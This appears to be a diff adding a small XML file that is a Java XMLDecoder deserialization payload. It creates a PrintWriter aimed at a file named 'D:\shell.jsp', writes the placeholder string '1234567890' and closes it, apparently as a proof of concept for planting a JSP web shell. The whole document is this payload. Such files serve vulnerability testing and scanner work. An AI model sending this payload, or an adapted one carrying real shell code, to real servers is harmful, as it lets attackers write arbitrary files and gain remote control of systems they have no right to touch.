@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<java>
+ <object class="java.io.PrintWriter">
+  <string>D:\shell.jsp</string>
+  <void method="println">
+  <string>
+   1234567890
+ </string>
+  </void>
+  <void method="close"/>
+ </object>
+</java>
